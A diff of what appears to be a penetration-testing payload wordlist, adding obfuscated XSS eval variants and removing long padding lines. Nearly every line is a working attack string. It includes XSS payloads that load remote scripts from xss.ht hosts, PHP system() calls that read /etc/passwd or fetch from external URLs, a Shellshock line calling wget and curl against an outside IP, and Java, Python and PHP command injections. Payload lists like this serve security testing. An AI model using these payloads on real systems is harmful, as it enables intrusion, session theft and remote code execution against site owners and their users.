@@ -17,8 +17,14 @@
 "><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vagfja2vyb25lb2zqywfhac54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7 autofocus>
 "><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vemvyby54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7 autofocus>
 "><script>alert(1)</script>=1"onpaste="eval(';)\'ssx\'(trela'.split('').reverse().join(''))"
+"><script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 "><script>eval(string.fromcharcode(75,67,70));</script>
 "><script>eval(string.fromcharcode(97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,97,46,115,114,99,61,39,104,116,116,112,58,47,47,104,52,107,46,105,110,47,105,46,106,115,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,97,41,59))</script>
+"><script>eval(‘a\154ert(1)’);</script>
+"><script>eval(‘a\l\ert\(1\)’);</script>
+"><script>eval(‘a\u006cert(1)’);</script>
+"><script>eval(‘a\x6cert(1)’);</script>
+"><script>eval(‘al’+’ert(1)’);</script>
 "><video><source onerror=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vemvyby54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7>
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/p8ml8.jpg">
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/p8ml8.jpg"><script>onerror=alert;throw 1337</script>
@@ -254,7 +260,13 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 '><img src="x:gif" onerror="eval('al'%2b'lert(1)')">
 '><img src=x:alert(alt) onerror=eval(src) alt=0>
 '><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://127.0.0.1:3555/xss_serve_payloads/x.jpg">
+'><script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 '><script>eval(string.fromcharcode(75,67,70));</script>
+'><script>eval(‘a\154ert(1)’);</script>
+'><script>eval(‘a\l\ert\(1\)’);</script>
+'><script>eval(‘a\u006cert(1)’);</script>
+'><script>eval(‘a\x6cert(1)’);</script>
+'><script>eval(‘al’+’ert(1)’);</script>
 () { :;};/usr/bin/perl -e 'print \"content-type: text/plain\\r\\n\\r\\nxsuccess!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
 (_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'eval("
 (location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}//<img src="x:x" onerror="if(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}">
@@ -277,7 +289,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <?php system("cat /etc/passwd");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
-<?php system("echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");?>
 <?php system("sleep 10");?>
 <?php system("sleep 5");?>
 <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
@@ -341,10 +352,16 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <script>eval("\x61\x6c\x65\x72\x74(1)");</script> // hexadecimal escapes using eval
 <script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('ywxlcnq=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>
 <script>eval('al'+'ert(1)');</script>
+<script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 <script>eval(location.hash)</script> (firefox)
 <script>eval(location.hash.slice(1))</script>
 <script>eval(location.hash.slice(1)</script>
 <script>eval(string.fromcharcode(75,67,70));</script>
+<script>eval(‘a\154ert(1)’);</script>
+<script>eval(‘a\l\ert\(1\)’);</script>
+<script>eval(‘a\u006cert(1)’);</script>
+<script>eval(‘a\x6cert(1)’);</script>
+<script>eval(‘al’+’ert(1)’);</script>
 <script>for((i)in(self))eval(i)(1)</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//hackeroneofjaaah.xss.ht");a.send();</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//zero.xss.ht");a.send();</script>
@@ -377,7 +394,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <video><source onerror="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
 ?t=confirm(1)&k7="><svg/t='&k8='onload='/&k9=/+eval(t)'
 ?xss7=''\"--><script>eval(string.fromcharcode(88,83,83)));%00
-["a",'eval("var _ = document.createelement(\'script\');
 __import__('os').system('ls')
 a=";get";;&;#10;b=";url(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';xss';);";)";;&#10;eval(a+b+c+d);
 a="get";&#10;b="url("";&#10;c="javascript:";&#10;d="alert('xss');")";eval(a+b+c+d);
@@ -428,7 +444,6 @@ eval('\u00' + '6' + '1'+'le' + '\u0072' + 't(1)')
 eval('\x61\x6c\x65\x72\x74(1)')
 eval('\x61ler\x74(1)')
 eval('alert(1)')
-eval('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
 eval('ls')
 eval('pwd')
 eval('pwd');
@@ -457,7 +472,6 @@ eval(string.raw({raw:'aet(1)'},'l','r'))
 eval(symbol(')-alert(1').tostring())
 eval(url.slice(-8))>#alert(1)
 eval(v+l+a+b);
-exec('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
 exec('ls')
 exec('pwd')
 exec('pwd');
@@ -492,6 +506,7 @@ inurl:"id=" & intext:"warning: require()
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms- behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
 javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
+javascript:/*–></marquee></script></title></textarea></noscript></style></xmp>”> [img=1]<img -/style=-=expression&#40/*’/-/*',/**/eval(name)//);wi dth:100%;height:100%;position:absolute;behavior:url(#default#vml);-o-link:javascript :eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>”"/>
 javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
 javascript:eval('var a=document.createelement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendchild(a)')
 javascript:eval('var a=document.createelement(\'script\');a.src=\'https://zero.xss.ht\';document.body.appendchild(a)')
@@ -539,7 +554,6 @@ system('curl https://crowdshield.com/.testing/rce_vuln.txt')
 system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
 system('curl https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
-system('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
 system('ls')
 system('pwd')
 system('pwd');
